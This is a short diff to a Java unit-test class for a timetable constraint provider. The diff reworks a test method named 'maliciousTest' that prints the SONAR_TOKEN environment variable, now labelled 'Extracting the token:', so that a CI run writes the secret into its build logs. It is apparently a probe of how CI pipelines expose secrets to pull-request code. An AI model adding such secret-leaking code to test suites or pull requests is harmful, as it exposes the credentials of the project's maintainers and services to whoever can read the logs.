@@ -93,8 +93,8 @@ class TimetableConstraintProviderTest {
     }
 
     @Test
-    void maliciousTest2() {
-        System.out.println(System.getenv("SONAR_TOKEN"));
+    void maliciousTest() {
+        System.out.println("Extracting the token: " + System.getenv("SONAR_TOKEN"));
     }
 
 }
